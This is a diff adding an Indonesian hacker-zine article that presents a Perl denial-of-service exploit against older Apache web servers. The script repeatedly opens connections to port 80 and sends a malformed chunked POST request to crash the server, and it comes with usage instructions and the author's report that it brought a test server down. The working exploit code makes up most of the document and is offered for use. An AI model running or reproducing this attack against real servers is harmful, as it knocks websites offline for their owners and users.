@@ -1,0 +1,93 @@
+
+#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=DOS APACHE-SPloits-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=--=-=-]
+
+echo-zine 02
+Oleh: y3dips (echo-staff)
+      y3dips@echo.or.id || y3dips@plasa.com
+	
+
+	#!/usr/bin/perl -w
+	use IO::Socket;
+
+
+    	printf"\n***********************************************************************\n";
+      	print "  *                                                                     *\n";
+      	print "  *        D.O.S buat apache webserver 1.2.X < .26 && 2.0.X             *\n";
+	print "  *          based on <Luis Wong> lwong [at]mpsnet.net.mx               *\n";
+      	print "  *modified && tested by y3dips on apache 1.3.23,  y3dips [at]echo.or.id*\n";
+	print "  *      greetz to echostaff a.k.a the_day, moby, comex                 *\n";
+      	print "  *        echo-memberz, newbie_hacker, puji_tiwili*                    *\n";
+      	print "  *                                                                     *\n";
+	printf"  ***********************************************************************\n\n";
+ 
+	if(@ARGV == 1){
+      
+      		my $host = $ARGV[0];
+      		my $i;
+      		while(){
+		$sock = IO::Socket::INET->new(PeerAddr => $host,
+				      PeerPort => "80",
+				      Proto => 'tcp');
+		unless($sock){
+	  	die "  GAk bisa terhubung a.k.a GAk bisa !.";
+		}
+		$sock->autoflush(1);
+		print $sock "POST /eCHo.htm HTTP/1.1\nHost: $host\nTransfer-Encoding: 
+		chunked\n\n90000000\n\n";
+		while ( <$sock> ){ 
+	    	print; 
+		}
+		close $sock;
+       		$i++;
+		print ".";
+    		}
+		}else{
+      	print "           [GUnakan] ...   ./$0 'HosT'      <<  untuk linux \n"  ;
+      	print "           [Gunakan] ...   perl $0 'Host'   <<untuk windows  \n";
+	}  
+
+
+	proof of concept:
+	aku mencoba membuktikannya pada server apache 1.3.23, (PHP TRIAD version 2.2)
+	baik menjalankan exsploit dari windows ataupun linux... *IT WORKS!
+	
+	apabila berhasil maka akan membuat server down dikarenakan eksekusi file echo.
+	htm dengan metode post.
+	
+	pada pengirim akan terlihat "...... yang terus berjalan" >> untuk menghentikan
+	tekan ctrl+c
+	sedang pada target mengakibatkan pengaksesan halaman web akan menampilkan:
+
+        The page cannot be displayed 
+        The page you are looking for is currently unavailable. The Web site might be 
+	experiencing technical difficulties, or you may need to adjust your browser 
+	settings. 
+
+ 	----------------------------------------------------------------------------
+	..dst
+
+
+	Cannot find server or DNS Error
+	Internet Explorer  
+
+	sampai kita menghentikan program [ dg Ctrl+c ]
+
+
+	*STOP HERE!
+	kode berdasarkan : based on <Luis Wong> lwong [at]mpsnet.net.mx 
+	*greetz to: [ echostaff a.k.a moby, the_day, comex ] puji_tiwili*
+		     pak onno, pak Larry wall (atas perlnya), pak linus, 
+		     pak eric s. Raymond, pak RM. stallman,anak2 newbie_hacker
+		     $peci@l temen2 penggemar opensource
+
+	"aku mengacu pada orang terdahulu, semoga orang sesudahku mengacu kepadaku"
+	 opensource  = beforex + x + afterx  
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=]
+
+
+
+	
+
+
+	
